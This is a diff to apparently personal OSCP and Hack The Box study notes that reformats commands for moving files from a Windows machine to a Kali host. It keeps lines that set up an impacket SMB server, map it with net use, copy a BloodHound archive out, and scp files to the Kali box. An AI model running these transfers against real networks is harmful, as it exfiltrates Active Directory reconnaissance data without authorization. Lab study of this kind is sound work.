@@ -3,9 +3,17 @@ kali>impacket-smbserver test . -smb2support  -username ashok -password reddy </b
 WIN>net use m: \\192.168.45.242\home\kali\Desktop\HTB\OSCP\AD\beyond /user:kourosh kourosh </br>
 WIN>copy 20240715135750_BloodHound.zip m:\ </br>
 
-##SSH
+ 0) SSH
+
+```bash
 kali>sudo service ssh start (Transfer file windows to kali)
+```
+
+```bash
 WIN>scp file kali@192.168.45.208:/home/kali/Desktop/HTB/OSCP(Windows)
+```
+
+
 
 OSCP Note - https://discord.com/channels/780824470113615893/1148907181480104028
 Youtube - https://www.youtube.com/watch?v=kd0sZWI6Blc
